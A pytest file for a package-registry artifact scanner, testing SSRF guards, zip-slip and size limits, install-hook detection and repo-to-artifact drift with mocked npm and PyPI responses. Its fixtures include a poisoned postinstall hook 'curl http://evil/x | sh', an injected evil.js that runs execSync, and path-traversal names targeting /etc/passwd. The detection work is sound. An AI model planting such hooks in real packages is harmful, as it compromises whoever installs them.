"""Phase 2 — published-artifact fetch + scan + repo↔artifact drift (all offline).

Canned in-memory tarball/wheel fixtures + httpx MockTransport, so no network is
hit. Covers: SSRF host-allowlist + redirect refusal, size/zip-bomb/zip-slip guards,
npm + PyPI resolve/download/unpack, install-hook detection (npm lifecycle + setup.py
AST), repo↔artifact drift, and the fail-open orchestrator.
"""
from __future__ import annotations

import io
import json
import tarfile
import zipfile

import httpx
import pytest

from src.scanner import artifact_fetch as af
from src.scanner.artifact_fetch import (
    ArtifactFetchError,
    _unpack_tar_gz,
    _unpack_zip,
    _validate_registry_url,
    fetch_npm_artifact,
    fetch_pypi_artifact,
)
from src.scanner.artifact_scan import (
    detect_pypi_install_exec,
    scan_published_artifact,
)

# ── fixture builders ─────────────────────────────────────────────────────────

def _make_targz(members: dict[str, bytes]) -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        for name, data in members.items():
            info = tarfile.TarInfo(name=name)
            info.size = len(data)
            tf.addfile(info, io.BytesIO(data))
    return buf.getvalue()


def _make_zip(members: dict[str, bytes]) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        for name, data in members.items():
            zf.writestr(name, data)
    return buf.getvalue()


def _mock_client(handler):
    return httpx.AsyncClient(transport=httpx.MockTransport(handler))


# ── SSRF host allowlist + redirect refusal ───────────────────────────────────

def test_registry_url_rejects_non_allowlisted_host():
    # Public IP literal → passes the SSRF private-range guard, but not allowlisted.
    with pytest.raises(ArtifactFetchError):
        _validate_registry_url("https://93.184.216.34/evil.tgz")


def test_registry_url_rejects_http_scheme():
    with pytest.raises(ValueError):
        _validate_registry_url("http://registry.npmjs.org/x")  # not https


def test_registry_url_accepts_allowlisted():
    assert _validate_registry_url(
        "https://files.pythonhosted.org/packages/x/pkg-1.0.tar.gz"
    )


@pytest.mark.asyncio
async def test_download_refuses_redirect():
    def handler(request: httpx.Request) -> httpx.Response:
        return httpx.Response(302, headers={"location": "https://evil.example/x"})

    async with _mock_client(handler) as client:
        with pytest.raises(ArtifactFetchError):
            await af._download("https://registry.npmjs.org/x.tgz", client)


# ── size / zip-bomb / zip-slip guards ─────────────────────────────────────────

def test_unpack_strips_package_prefix_and_classifies():
    raw = _make_targz({
        "package/index.js": b"console.log(1)",
        "package/logo.png": b"\x89PNG\x00\x01binary",  # NUL → binary
    })
    files = af._build_file_map(_unpack_tar_gz(raw))
    assert "index.js" in files and "logo.png" in files  # package/ stripped
    assert files["index.js"].text == "console.log(1)"
    assert files["index.js"].is_binary is False
    assert files["logo.png"].is_binary is True
    assert files["logo.png"].text is None


def test_unpack_rejects_path_traversal():
    raw = _make_targz({"package/../../etc/passwd": b"x"})
    with pytest.raises(ArtifactFetchError):
        _unpack_tar_gz(raw)


def test_unpack_rejects_absolute_path_in_zip():
    raw = _make_zip({"/etc/shadow": b"x"})
    with pytest.raises(ArtifactFetchError):
        _unpack_zip(raw)


def test_unpack_enforces_per_file_cap(monkeypatch):
    monkeypatch.setattr(af, "MAX_MEMBER_BYTES", 8)
    raw = _make_targz({"package/big.js": b"0123456789"})  # 10 bytes > 8
    with pytest.raises(ArtifactFetchError):
        _unpack_tar_gz(raw)


def test_unpack_enforces_file_count_cap(monkeypatch):
    monkeypatch.setattr(af, "MAX_FILE_COUNT", 1)
    raw = _make_targz({"package/a.js": b"a", "package/b.js": b"b"})
    with pytest.raises(ArtifactFetchError):
        _unpack_tar_gz(raw)


def test_unpack_enforces_unpacked_size_cap(monkeypatch):
    monkeypatch.setattr(af, "MAX_UNPACKED_BYTES", 5)
    raw = _make_targz({"package/a.js": b"012345"})  # 6 > 5
    with pytest.raises(ArtifactFetchError):
        _unpack_tar_gz(raw)


@pytest.mark.asyncio
async def test_download_enforces_size_cap(monkeypatch):
    monkeypatch.setattr(af, "MAX_DOWNLOAD_BYTES", 4)

    def handler(request: httpx.Request) -> httpx.Response:
        return httpx.Response(200, content=b"way too many bytes")

    async with _mock_client(handler) as client:
        with pytest.raises(ArtifactFetchError):
            await af._download("https://registry.npmjs.org/x.tgz", client)


# ── npm resolve + fetch + unpack ──────────────────────────────────────────────

def _npm_handler(name: str, version: str, tarball: bytes):
    tarball_url = f"https://registry.npmjs.org/{name}/-/{name}-{version}.tgz"

    def handler(request: httpx.Request) -> httpx.Response:
        path = request.url.path
        if path == f"/{name}":
            return httpx.Response(200, json={
                "dist-tags": {"latest": version},
                "versions": {version: {
                    "name": name, "version": version,
                    "dist": {"tarball": tarball_url},
                }},
            })
        if path == f"/{name}/-/{name}-{version}.tgz":
            return httpx.Response(200, content=tarball)
        return httpx.Response(404)

    return handler


@pytest.mark.asyncio
async def test_fetch_npm_artifact_happy_path():
    tarball = _make_targz({
        "package/package.json": json.dumps({
            "name": "demo", "version": "1.0.0",
            "scripts": {"postinstall": "node -e \"require('http')\""},
        }).encode(),
        "package/index.js": b"module.exports = 1",
    })
    async with _mock_client(_npm_handler("demo", "1.0.0", tarball)) as client:
        res = await fetch_npm_artifact("demo", None, client=client)
    assert res.ok is True
    assert res.kind == "tarball"
    assert res.digest.startswith("sha256:")
    assert res.packaged_manifest["name"] == "demo"
    assert "index.js" in res.files


# ── PyPI resolve + fetch (sdist + wheel) ──────────────────────────────────────

@pytest.mark.asyncio
async def test_fetch_pypi_sdist_happy_path():
    sdist = _make_targz({
        "demo-1.0/setup.py": b"from setuptools import setup\nsetup(name='demo')\n",
        "demo-1.0/demo/__init__.py": b"x = 1\n",
    })
    url = "https://files.pythonhosted.org/packages/aa/demo-1.0.tar.gz"

    def handler(request: httpx.Request) -> httpx.Response:
        if request.url.path == "/pypi/demo/json":
            return httpx.Response(200, json={
                "info": {"version": "1.0"},
                "urls": [{"packagetype": "sdist", "url": url}],
            })
        if request.url.host == "files.pythonhosted.org":
            return httpx.Response(200, content=sdist)
        return httpx.Response(404)

    async with _mock_client(handler) as client:
        res = await fetch_pypi_artifact("demo", None, client=client)
    assert res.ok is True
    assert res.kind == "sdist"
    assert "setup.py" in res.files  # demo-1.0/ prefix stripped
    assert "demo/__init__.py" in res.files


@pytest.mark.asyncio
async def test_fetch_pypi_wheel_when_no_sdist():
    wheel = _make_zip({
        "demo/__init__.py": b"y = 2\n",
        "demo-1.0.dist-info/METADATA": b"Name: demo\n",
    })
    url = "https://files.pythonhosted.org/packages/bb/demo-1.0-py3-none-any.whl"

    def handler(request: httpx.Request) -> httpx.Response:
        if request.url.path == "/pypi/demo/1.0/json":
            return httpx.Response(200, json={
                "info": {"version": "1.0"},
                "urls": [{"packagetype": "bdist_wheel", "url": url}],
            })
        if request.url.host == "files.pythonhosted.org":
            return httpx.Response(200, content=wheel)
        return httpx.Response(404)

    async with _mock_client(handler) as client:
        res = await fetch_pypi_artifact("demo", "1.0", client=client)
    assert res.ok is True
    assert res.kind == "wheel"
    assert "demo/__init__.py" in res.files


# ── setup.py install-time exec (AST) ──────────────────────────────────────────

def test_setup_py_os_system_is_high():
    src = "import os\nfrom setuptools import setup\nos.system('echo hi')\nsetup(name='x')\n"
    findings = detect_pypi_install_exec(src, "setup.py")
    assert len(findings) == 1
    assert findings[0].category == "install_hook"
    assert findings[0].severity == "high"


def test_setup_py_network_plus_exec_is_critical():
    src = (
        "import os\nfrom urllib.request import urlopen\n"
        "urlopen('http://x/y')\nos.system('sh')\n"
    )
    findings = detect_pypi_install_exec(src, "setup.py")
    assert findings and findings[0].severity == "critical"


def test_setup_py_cmdclass_flagged_medium():
    src = (
        "from setuptools import setup\n"
        "from setuptools.command.install import install\n"
        "class C(install):\n    pass\n"
        "setup(name='x', cmdclass={'install': C})\n"
    )
    findings = detect_pypi_install_exec(src, "setup.py")
    assert findings and findings[0].severity == "medium"


def test_setup_py_clean_no_findings():
    src = "from setuptools import setup\nsetup(name='x', version='1.0')\n"
    assert detect_pypi_install_exec(src, "setup.py") == []


def test_setup_py_syntax_error_fails_open():
    assert detect_pypi_install_exec("def (:::", "setup.py") == []


# ── end-to-end orchestrator: poisoned tarball vs clean repo ──────────────────

@pytest.mark.asyncio
async def test_scan_published_artifact_detects_drift_and_hook():
    # Repo has index.js + package.json; the published tarball ALSO ships evil.js
    # (injected) and a dangerous postinstall hook — the poisoned-tarball attack.
    tarball = _make_targz({
        "package/package.json": json.dumps({
            "name": "demo", "version": "1.0.0",
            "scripts": {"postinstall": "curl http://evil/x | sh"},
        }).encode(),
        "package/index.js": b"module.exports = 1",
        "package/evil.js": b"eval(require('child_process').execSync('id'))",
    })
    repo_paths = {"index.js", "package.json"}

    async with _mock_client(_npm_handler("demo", "1.0.0", tarball)) as client:
        res = await scan_published_artifact(
            "npm", "demo", None, repo_paths=repo_paths, client=client,
        )
    assert res.ok is True
    assert res.digest and res.digest.startswith("sha256:")
    assert res.registry_snapshot  # pinned for recompute
    # drift: evil.js is artifact-only
    assert "evil.js" in res.drift["added_files"]
    assert res.drift["has_install_hook"] is True
    cats = {f.category for f in res.findings}
    assert "install_hook" in cats     # npm postinstall lifecycle hook
    assert "artifact_drift" in cats    # injected file + hook drift
    # the injected file's eval is caught by the reused 12-category engine
    assert any(f.category in ("unsafe_exec", "dynamic_remote_load") for f in res.findings)


@pytest.mark.asyncio
async def test_scan_published_artifact_modified_file_drift():
    tarball = _make_targz({
        "package/package.json": b'{"name":"demo","version":"1.0.0"}',
        "package/index.js": b"DIFFERENT CONTENT",
    })
    # repo hash for index.js differs from the artifact's content → modified drift
    import hashlib
    repo_hashes = {"index.js": hashlib.sha256(b"ORIGINAL").hexdigest()}

    async with _mock_client(_npm_handler("demo", "1.0.0", tarball)) as client:
        res = await scan_published_artifact(
            "npm", "demo", None,
            repo_paths={"index.js", "package.json"},
            repo_text_hashes=repo_hashes, client=client,
        )
    assert res.ok is True
    assert "index.js" in res.drift["modified_files"]


@pytest.mark.asyncio
async def test_scan_published_artifact_noncorresponding_tree_no_false_drift():
    # Package published from a monorepo subdir: no artifact path matches the repo
    # tree → comparison is inconclusive, NOT a storm of false "added" findings.
    tarball = _make_targz({
        "package/package.json": b'{"name":"demo","version":"1.0.0"}',
        "package/index.js": b"module.exports = 1",
    })
    async with _mock_client(_npm_handler("demo", "1.0.0", tarball)) as client:
        res = await scan_published_artifact(
            "npm", "demo", None,
            repo_paths={"packages/demo/src/foo.ts", "README.md"}, client=client,
        )
    assert res.ok is True
    assert res.drift["compared"] is False
    assert res.drift["added_files"] == []
    assert not any(f.category == "artifact_drift"
                   and f.name.startswith("Published artifact ships")
                   for f in res.findings)


# ── fail-open ─────────────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_scan_published_artifact_unknown_ecosystem_fails_open():
    res = await scan_published_artifact("cargo", "x", "1.0")
    assert res.ok is False
    assert res.error


@pytest.mark.asyncio
async def test_scan_published_artifact_fetch_error_fails_open():
    def handler(request: httpx.Request) -> httpx.Response:
        return httpx.Response(404)

    async with _mock_client(handler) as client:
        res = await scan_published_artifact("npm", "nope", "1.0", client=client)
    assert res.ok is False
    assert res.error
    assert res.findings == []
